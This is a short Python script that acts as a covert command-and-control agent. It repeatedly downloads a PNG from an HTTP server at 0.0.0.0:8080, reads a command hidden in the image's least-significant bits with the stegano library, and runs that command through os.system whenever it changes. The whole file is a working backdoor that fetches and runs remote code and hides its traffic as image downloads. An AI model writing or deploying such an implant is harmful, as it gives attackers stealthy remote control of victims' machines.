import os
import requests
from stegano import lsb

leet = 'leet.png'
last = ''

while True:
	r = requests.get('http://0.0.0.0:8080/leet.png')
	open(leet, 'wb').write(r.content)
	revealed = lsb.reveal(leet)
	cmd = revealed	
	if last != revealed:
		print('\n')
		print('-'*50)
		os.system(revealed)
		last = revealed
